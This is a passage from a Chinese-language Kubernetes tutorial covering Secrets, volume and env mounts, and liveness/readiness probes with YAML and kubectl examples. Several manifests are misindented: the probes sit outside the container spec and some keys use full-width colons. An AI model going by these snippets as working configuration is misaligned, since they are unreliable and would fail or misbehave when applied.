href="#11-7-3-Opaque-Secret-实战步骤" class="headerlink" title="11.7.3. Opaque Secret 实战步骤"></a>11.7.3. Opaque Secret 实战步骤</h5><h6 id="11-7-3-1-为铭感数据进行-base64-编码"><a href="#11-7-3-1-为铭感数据进行-base64-编码" class="headerlink" title="11.7.3.1. 为铭感数据进行 base64 编码"></a>11.7.3.1. 为铭感数据进行 base64 编码</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;admin&quot;</span> | <span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>也可以使用其他工具进 base64 编码，编码的方式不限</li></ol></blockquote><hr><h6 id="11-7-3-2-创建-Secret-资源"><a href="#11-7-3-2-创建-Secret-资源" class="headerlink" title="11.7.3.2. 创建 Secret 资源"></a>11.7.3.2. 创建 Secret 资源</h6><p>&#x3D;&#x3D;1.编写 Secret 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">apiVersion: v1<br>kind: Secret<br>metadata:<br>  name: my-secret<br>  <span class="hljs-keyword">namespace</span>: <span class="hljs-symbol">default</span><br><span class="hljs-symbol">type</span>: <span class="hljs-symbol">Opaque</span><br><span class="hljs-symbol">data</span>:<br>  <span class="hljs-symbol">username</span>: <span class="hljs-symbol">YWRtaW4</span>=                               # <span class="hljs-symbol">base64</span> 编码后的 &quot;<span class="hljs-symbol">admin</span>&quot;<br>  <span class="hljs-symbol">password</span>: <span class="hljs-symbol">c2VjcmV0MTIz</span>                           # <span class="hljs-symbol">base64</span> 编码后的 &quot;<span class="hljs-symbol">secret123</span>&quot;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.创建 Secret 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f opaque-secret.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.查看 Secret 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-built_in">get</span><span class="hljs-built_in"> secret </span> -o yaml<br></code></pre></td></tr></table></figure><hr><h6 id="11-7-3-3-Pod-挂载-Opaque-Secret（以-Env-挂载）"><a href="#11-7-3-3-Pod-挂载-Opaque-Secret（以-Env-挂载）" class="headerlink" title="11.7.3.3. Pod 挂载 Opaque Secret（以 Env 挂载）"></a>11.7.3.3. Pod 挂载 Opaque Secret（以 Env 挂载）</h6><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> pod-<span class="hljs-keyword">with</span>-secret-env<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">containers:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> my-container<br>      <span class="hljs-params">image:</span> nginx<br>      <span class="hljs-params">env:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> USERNAME<br>          <span class="hljs-params">valueFrom:</span><br>            <span class="hljs-params">secretKeyRef:</span><br>              <span class="hljs-params">name:</span> my-secret<br>              <span class="hljs-params">key:</span> username<br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> PASSWORD<br>          <span class="hljs-params">valueFrom:</span><br>            <span class="hljs-params">secretKeyRef:</span><br>              <span class="hljs-params">name:</span> my-secret<br>              <span class="hljs-params">key:</span> password<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>由于 <code>Secret</code> 中的数据是 Base64 编码的，Kubernetes 会在容器启动时自动解码。例如：<code>DATABASE_USER</code> 环境变量的值会被解码为 <code>&quot;admin</code></li></ol></blockquote><hr><h6 id="11-7-3-4-在-Pod-中使用-Opaque-Secret（以-Env-输出）"><a href="#11-7-3-4-在-Pod-中使用-Opaque-Secret（以-Env-输出）" class="headerlink" title="11.7.3.4. 在 Pod 中使用 Opaque Secret（以 Env 输出）"></a>11.7.3.4. 在 Pod 中使用 Opaque Secret（以 Env 输出）</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$USERNAME</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PASSWORD</span><br></code></pre></td></tr></table></figure><hr><h5 id="11-7-4-dockerconfigjson-Secret-实战步骤"><a href="#11-7-4-dockerconfigjson-Secret-实战步骤" class="headerlink" title="11.7.4. dockerconfigjson Secret 实战步骤"></a>11.7.4. dockerconfigjson Secret 实战步骤</h5><h6 id="11-7-4-1-准备-Docker-仓库认证信息"><a href="#11-7-4-1-准备-Docker-仓库认证信息" class="headerlink" title="11.7.4.1. 准备 Docker 仓库认证信息"></a>11.7.4.1. 准备 Docker 仓库认证信息</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">DOCKER_REGISTRY_SERVER</span>=<span class="hljs-string">&quot;your-docker-registry-server&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">DOCKER_USERNAME</span>=<span class="hljs-string">&quot;your-docker-username&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">DOCKER_PASSWORD</span>=<span class="hljs-string">&quot;your-docker-password&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">DOCKER_EMAIL</span>=<span class="hljs-string">&quot;your-docker-email&quot;</span><br></code></pre></td></tr></table></figure><hr><h6 id="11-7-4-2-创建-Secret-资源"><a href="#11-7-4-2-创建-Secret-资源" class="headerlink" title="11.7.4.2. 创建 Secret 资源"></a>11.7.4.2. 创建 Secret 资源</h6><p>&#x3D;&#x3D;1.创建 Secret 资源&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl create<span class="hljs-built_in"> secret </span>docker-registry myregistrykey \<br>  <span class="hljs-attribute">--docker-server</span>=<span class="hljs-variable">$DOCKER_REGISTRY_SERVER</span> \<br>  <span class="hljs-attribute">--docker-username</span>=<span class="hljs-variable">$DOCKER_USERNAME</span> \<br>  <span class="hljs-attribute">--docker-password</span>=<span class="hljs-variable">$DOCKER_PASSWORD</span> \<br>  <span class="hljs-attribute">--docker-email</span>=<span class="hljs-variable">$DOCKER_EMAIL</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.查看 Secret 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-built_in">get</span><span class="hljs-built_in"> secret </span>-o yaml<br></code></pre></td></tr></table></figure><hr><h6 id="11-7-4-3-Pod-中指定-dockerconfigjson-Secret"><a href="#11-7-4-3-Pod-中指定-dockerconfigjson-Secret" class="headerlink" title="11.7.4.3. Pod 中指定 dockerconfigjson Secret"></a>11.7.4.3. Pod 中指定 dockerconfigjson Secret</h6><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> foo<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">containers:</span>                                      <span class="hljs-comment"># 使用 dockerconfigjson Secret 拉取进行</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> foo<br>      <span class="hljs-params">image:</span> <span class="hljs-symbol">&lt;your-docker-registry-server&gt;</span><span class="hljs-operator">/</span><span class="hljs-symbol">&lt;your-image&gt;</span>:<span class="hljs-symbol">&lt;tag&gt;</span><br>  <span class="hljs-params">imagePullSecrets:</span>                                <span class="hljs-comment"># 指定 dockerconfigjson Secret</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> myregistrykey                          <br></code></pre></td></tr></table></figure><hr><h4 id="11-8-补充：Volume-挂载方法"><a href="#11-8-补充：Volume-挂载方法" class="headerlink" title="11.8. 补充：Volume 挂载方法"></a>11.8. 补充：Volume 挂载方法</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">spec:</span><br>  <span class="hljs-params">volumes:</span>                                        <span class="hljs-comment"># 定义 Pod 级别的存储卷</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> config-volume                         <span class="hljs-comment"># 存储卷名称</span><br>      xxxxxxxxx                                   <span class="hljs-comment"># 指定卷的存储方式，即数据来源</span><br><br>  <span class="hljs-params">containers:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> nginx<br>      <span class="hljs-params">image:</span> nginx:latest<br>      <span class="hljs-params">volumeMounts:</span>                               <span class="hljs-comment"># 容器内卷的挂载配置</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> config-volume                     <span class="hljs-comment"># 指定要挂载的存储卷的名称</span><br>          <span class="hljs-params">mountPath:</span> <span class="hljs-symbol">/etc/nginx/nginx.conf</span>        <span class="hljs-comment"># 挂载点，即存储卷挂载到容器内的哪个目录</span><br>          <span class="hljs-params">subPath:</span> nginx.conf                     <span class="hljs-comment"># 只挂载卷内的某个子路径或特定文件，而不是整个卷</span><br>          <span class="hljs-params">readOnly:</span> <span class="hljs-literal">false</span>                         <span class="hljs-comment"># 指定是否以只读方式挂载（false 表示可读写）</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">subPath: nginx.conf</font>：<ul><li>用于只挂载卷中的某个特定子路径（例如 ConfigMap 中的单个文件），而不是整个卷的内容。这样可以实现对特定配置文件的精确覆盖。</li><li>这意味着容器中的 <code>/etc/nginx/nginx.conf</code> 文件将被 ConfigMap 中的 <code>nginx.conf</code> 文件内容<strong>替代</strong>。</li></ul></li><li><font color="#00b0f0">常见卷的存储方式</font>：<ul><li>emptyDir</li><li>hostPath</li><li>nfs</li><li>persistentVolumeClaim</li></ul></li><li><font color="#00b0f0">注意事项</font>：<ul><li>如果容器中的挂载点已经有文件，挂载存储卷后，原有文件会被暂时替代</li></ul></li></ol></blockquote><hr><h4 id="11-9-补充：Env-挂载方法和相关命令"><a href="#11-9-补充：Env-挂载方法和相关命令" class="headerlink" title="11.9. 补充：Env 挂载方法和相关命令"></a>11.9. 补充：Env 挂载方法和相关命令</h4><p>&#x3D;&#x3D;1.挂载方法&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">spec:</span><br>  <span class="hljs-params">containers:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> my-container<br>      <span class="hljs-params">image:</span> nginx:latest<br>      <span class="hljs-params">envFrom:</span>                          <span class="hljs-comment"># 从外部源（如 ConfigMap、Secret）加载多个环境变量</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">configMapRef:</span>                 <span class="hljs-comment"># 引用一个 ConfigMap，将其中的所有键值对加载为环境变量</span><br>            <span class="hljs-params">name:</span> my-variate-config1    <span class="hljs-comment"># ConfigMap 的名称</span><br><span class="hljs-operator">-</span> <span class="hljs-params">secretRef:</span>                    <span class="hljs-comment"># 引用一个 Secret，将其中的所有键值对加载为环境变量</span><br>    <span class="hljs-params">name:</span> my-opaque-secret1     <span class="hljs-comment"># Secret 的名称</span><br>      <span class="hljs-params">env:</span>                              <span class="hljs-comment"># 手动 指定 / 覆盖 / 获取环境变量</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> USER                    <span class="hljs-comment"># 指定环境变量的名称</span><br>          <span class="hljs-params">value:</span> <span class="hljs-string">&quot;nginx_admin&quot;</span>          <span class="hljs-comment"># 手动 指定 / 覆盖 环境变量的值</span><br><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> MY_ENV <br>      <span class="hljs-params">valueFrom:</span>                    <span class="hljs-comment"># 从外部源获取环境变量的值</span><br>        <span class="hljs-params">configMapKeyRef:</span>            <span class="hljs-comment"># 从 ConfigMap 中获取某键个值</span><br>          <span class="hljs-params">name:</span> my-variate-config2  <span class="hljs-comment"># ConfigMap 的名称</span><br>          <span class="hljs-params">key:</span> my-key               <span class="hljs-comment"># CconfigMap 键的名称</span><br><span class="hljs-params">secretKeyRef:</span>               <span class="hljs-comment"># 从 Secret 中获取某个键的值（一般是 Opaque Secret）</span><br>  <span class="hljs-params">name:</span> my-opaque-secret2   <span class="hljs-comment"># Secret 的名称</span><br>  <span class="hljs-params">key:</span> my-key               <span class="hljs-comment"># Secret 键的名称</span><br>    <span class="hljs-params">fieldRef:</span>                   <span class="hljs-comment"># 从当前 Pod 的 metadata 中获取值</span><br>      <span class="hljs-params">fieldPath:</span> metadata.name  <span class="hljs-comment"># 获取 metadata.name</span><br>    <span class="hljs-params">resourceFieldRef:</span>           <span class="hljs-comment"># 从当前 Pod 的 resources 下的 limits 或 requests 中获取值</span><br>      <span class="hljs-params">resource:</span> limits.cpu      <span class="hljs-comment"># 获取 limits.cpu</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：指定 &#x2F; 覆盖</p><ol><li>若环境变量不存在，则设置为指定值；</li><li>若环境变量已存在，则覆盖原有值</li></ol></blockquote><blockquote><p>[!NOTE] 注意事项：<code>env</code></p><ol><li><code>env</code> 用于手动设置环境变量</li><li>如果 ConfigMap 中存在与 <code>env</code> 中相同名称的环境变量，则 <code>env</code> 中的值将覆盖 ConfigMap 中的值。</li><li>如果 ConfigMap 中没有与 <code>env</code> 中同名的环境变量，则 <code>env</code> 中的值将成为最终值。</li></ol></blockquote><p>&#x3D;&#x3D;2.相关命令&#x3D;&#x3D;<br>这些命令的前提是，先进入 Pod：<code>kubectl exec -it &lt;pod-name&gt; -- /bin/bash</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 查看当前 Pod 的环境变量</span><br><span class="hljs-built_in">env</span><br><br><br><span class="hljs-comment"># 2. 输出环境变量</span><br><span class="hljs-variable">$&#123;xxxxx&#125;</span><br></code></pre></td></tr></table></figure><hr><h4 id="11-10-补充：Volume-和-Env-挂载的区别"><a href="#11-10-补充：Volume-和-Env-挂载的区别" class="headerlink" title="11.10. 补充：Volume 和 Env 挂载的区别"></a>11.10. 补充：Volume 和 Env 挂载的区别</h4><ol><li>&#x3D;&#x3D;Volume 挂载&#x3D;&#x3D;：适用于将整个<strong>文件</strong>或多个文件一次性挂载到容器中，它的文件类型不限</li><li>&#x3D;&#x3D;Env 挂载&#x3D;&#x3D;：适用于将文件中的部分或全部<strong>键值对</strong>加载为环境变量，之后可以通过 <code>$&#123;xxxx&#125;</code> 的方式引用这些值，一般是使用 <code>properties</code> 类型的文件</li></ol><hr><h3 id="12-K8S-核心概念：K8S-探针"><a href="#12-K8S-核心概念：K8S-探针" class="headerlink" title="12. K8S 核心概念：K8S 探针"></a>12. K8S 核心概念：K8S 探针</h3><h4 id="12-1-K8S-探针-的组成"><a href="#12-1-K8S-探针-的组成" class="headerlink" title="12.1. K8S 探针 的组成"></a>12.1. K8S 探针 的组成</h4><p>在 K8s 中，探针有以下两位明星：</p><ol><li>&#x3D;&#x3D;liveness probe（存活探针）&#x3D;&#x3D;<ol><li><code>Liveness Probe</code> 用于检测容器是否还活着，如果容器的存活探针失败，Kubernetes 会认为该容器处于故障状态并尝试重启它（是否重启还要根据容器的重启策略，如果你设置不重启，那没办法重启）。</li></ol></li><li>&#x3D;&#x3D;readiness probe（就绪探针）&#x3D;&#x3D;<ol start="2"><li><code>Readiness Probe</code> 用于检测容器是否已经准备好接收流量，只有当就绪探针成功时，Kubernetes Service 才会将流量路由到该容器。</li></ol></li></ol><hr><h4 id="12-2-存活探针实战步骤"><a href="#12-2-存活探针实战步骤" class="headerlink" title="12.2. 存活探针实战步骤"></a>12.2. 存活探针实战步骤</h4><h5 id="12-2-1-HTTP-GET-探针"><a href="#12-2-1-HTTP-GET-探针" class="headerlink" title="12.2.1. HTTP GET 探针"></a>12.2.1. HTTP GET 探针</h5><p>适用于容器内部有提供 HTTP 服务的应用程序，尤其是 Web 服务，容器响应的 HTTP 状态码可以用于判断健康（如 <code>200 OK</code> 表示健康，<code>500</code> 或 <code>404</code> 等表示不健康）。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> goproxy<br>  <span class="hljs-params">labels:</span><br>    <span class="hljs-params">app:</span> goproxy<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">containers:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> goproxy<br>    <span class="hljs-params">image:</span> k8s.gcr.io<span class="hljs-operator">/</span>goproxy:<span class="hljs-number">0.1</span><br><br><span class="hljs-params">livenessProbe:</span>                                <span class="hljs-comment"># 配置存活探针</span><br>  <span class="hljs-params">httpGet:</span>                                    <span class="hljs-comment"># 使用 http get 探针</span><br>    <span class="hljs-params">path:</span> <span class="hljs-symbol">/healthz</span><br>    <span class="hljs-params">port:</span> <span class="hljs-number">8080</span><br>  <span class="hljs-params">initialDelaySeconds:</span> <span class="hljs-number">3</span>                      <span class="hljs-comment"># 容器启动后，第一次探测钱等待多少秒，这里是 3s</span><br>  <span class="hljs-params">periodSeconds:</span> <span class="hljs-number">10</span>                           <span class="hljs-comment"># 探测的频率，这里是 10s</span><br>  <span class="hljs-params">timeoutSeconds:</span> <span class="hljs-number">1</span>                           <span class="hljs-comment"># 探测超时时间，超时代表本次探测失败，这里是 1s</span><br>  successThreshold：<span class="hljs-number">1</span>                         <span class="hljs-comment"># 需要**连续**几次探测成功，才认为存活，这里是 1次</span><br>  failureThreshold：<span class="hljs-number">3</span>                         <span class="hljs-comment"># 需要**连续**几次探测失败，才认为不存活，这里是 3次</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>/healthz</code> 需要我们自己提供，如：</li></ol></blockquote><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HealthController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/healthz&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> ResponseEntity&lt;String&gt; healthCheck() &#123;<br>        <span class="hljs-comment">// 返回 200 OK，表示健康（不健康让 spring boot 自己返回去吧）</span><br>        <span class="hljs-keyword">return</span> ResponseEntity.ok(<span class="hljs-string">&quot;Healthy&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="12-2-2-TCP-Socket-探针"><a href="#12-2-2-TCP-Socket-探针" class="headerlink" title="12.2.2. TCP Socket 探针"></a>12.2.2. TCP Socket 探针</h5><p>适用于数据库、消息队列等服务，它们可能没有 HTTP 接口，所以我们只需要检查其端口的可用性，能否建立连接</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">goproxy</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">goproxy</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">goproxy</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">k8s.gcr.io/goproxy:0.1</span><br><br><span class="hljs-attr">livenessProbe:</span>                                <span class="hljs-comment"># 配置存活探针</span><br>  <span class="hljs-attr">tcpSocket:</span>                                  <span class="hljs-comment"># 使用 tcp socket 探针</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">3306</span>                                <span class="hljs-comment"># 连接的端口，推荐与容器内的应用监听的一致           </span><br>  <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">3</span>                      <span class="hljs-comment"># 容器启动后，第一次探测钱等待多少秒，这里是 3s</span><br>  <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">10</span>                           <span class="hljs-comment"># 探测的频率，这里是 10s</span><br>  <span class="hljs-attr">timeoutSeconds:</span> <span class="hljs-number">1</span>                           <span class="hljs-comment"># 探测超时时间，超时代表本次探测失败，这里是 1s</span><br>  <span class="hljs-string">successThreshold：1</span>                         <span class="hljs-comment"># 需要**连续**几次探测成功，才认为存活，这里是 1次</span><br>  <span class="hljs-string">failureThreshold：3</span>                         <span class="hljs-comment"># 需要**连续**几次探测失败，才认为不存活，这里是 3次</span><br></code></pre></td></tr></table></figure><hr><h5 id="12-2-3-命令探针"><a href="#12-2-3-命令探针" class="headerlink" title="12.2.3. 命令探针"></a>12.2.3. 命令探针</h5><p>适用于需要执行特定命令来判断容器健康状态的场景。应用程序没有 HTTP 服务或 TCP 服务，但可以通过执行某些命令检查应用状态。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> goproxy<br>  <span class="hljs-params">labels:</span><br>    <span class="hljs-params">app:</span> goproxy<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">containers:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> goproxy<br>    <span class="hljs-params">image:</span> k8s.gcr.io<span class="hljs-operator">/</span>goproxy:<span class="hljs-number">0.1</span><br><br><span class="hljs-params">livenessProbe:</span>                                <span class="hljs-comment"># 配置存活探针</span><br>  <span class="hljs-params">exec:</span>                                       <span class="hljs-comment"># 使用命令探针</span><br>    <span class="hljs-params">command:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;sh&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;-c&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;curl -f http://localhost:8080/healthz || exit 1&quot;</span>       <br>  <span class="hljs-params">initialDelaySeconds:</span> <span class="hljs-number">3</span>                      <span class="hljs-comment"># 容器启动后，第一次探测钱等待多少秒，这里是 3s</span><br>  <span class="hljs-params">periodSeconds:</span> <span class="hljs-number">10</span>                           <span class="hljs-comment"># 探测的频率，这里是 10s</span><br>  <span class="hljs-params">timeoutSeconds:</span> <span class="hljs-number">1</span>                           <span class="hljs-comment"># 探测超时时间，超时代表本次探测失败，这里是 1s</span><br>  successThreshold：<span class="hljs-number">1</span>                         <span class="hljs-comment"># 需要**连续**几次探测成功，才认为存活，这里是 1次</span><br>  failureThreshold：<span class="hljs-number">3</span>                         <span class="hljs-comment"># 需要**连续**几次探测失败，才认为不存活，这里是 3次</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>上面三种探针可以结合使用，并不是说只能使用一种探针</li></ol></blockquote><hr><h4 id="12-3-就绪探针实战步骤"><a href="#12-3-就绪探针实战步骤" class="headerlink" title="12.3. 就绪探针实战步骤"></a>12.3. 就绪探针实战步骤</h4><h5 id="12-3-1-HTTP-GET-探针"><a href="#12-3-1-HTTP-GET-探针" class="headerlink" title="12.3.1. HTTP GET 探针"></a>12.3.1. HTTP GET 探针</h5><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> goproxy<br>  <span class="hljs-params">labels:</span><br>    <span class="hljs-params">app:</span> goproxy<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">containers:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> goproxy<br>    <span class="hljs-params">image:</span> k8s.gcr.io<span class="hljs-operator">/</span>goproxy:<span class="hljs-number">0.1</span><br><br><span class="hljs-params">readinessProbe:</span><br>  <span class="hljs-params">httpGet:</span><br>    <span class="hljs-params">path:</span> <span class="hljs-symbol">/readiness</span><br>    <span class="hljs-params">port:</span> <span class="hljs-number">8080</span><br>  <span class="hljs-params">initialDelaySeconds:</span> <span class="hljs-number">3</span><br>  <span class="hljs-params">periodSeconds:</span> <span class="hljs-number">10</span><br>  <span class="hljs-params">timeoutSeconds:</span> <span class="hljs-number">1</span><br>  successThreshold：<span class="hljs-number">1</span><br>  failureThreshold：<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><hr><h5 id="12-3-2-TCP-Socket-探针"><a href="#12-3-2-TCP-Socket-探针" class="headerlink" title="12.3.2. TCP Socket 探针"></a>12.3.2. TCP Socket 探针</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 